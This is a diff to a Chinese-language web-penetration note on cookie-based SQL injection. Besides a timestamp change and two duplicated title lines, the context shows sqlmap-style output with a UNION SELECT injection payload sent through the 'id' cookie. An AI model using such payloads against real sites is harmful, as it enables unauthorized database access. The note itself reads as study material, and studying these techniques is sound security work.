@@ -3,7 +3,7 @@ title: Cookie注入
 date: 2024-11-23T22:23:01Z
 lastmod: 2024-11-23T22:26:12Z
 created: 2024-11-27T22:18
-updated: 2024-12-14T19:10
+updated: 2024-12-14T19:12
 ---
 
 # Cookie注入
@@ -23,6 +23,8 @@ Parameter: id (Cookie)
     Title: Generic UNION query (NULL) - 2 columns
     Payload: id=-5888 UNION ALL SELECT CONCAT(0x7162786b71,0x7878714d716972454578746451454d494c636f62545556576b504b4f7976505651705a416f514a63,0x7170767871),NULL-- -
 tags: [web渗透]
+title: Cookie注入
+title: Cookie注入
 ---
 ```
 
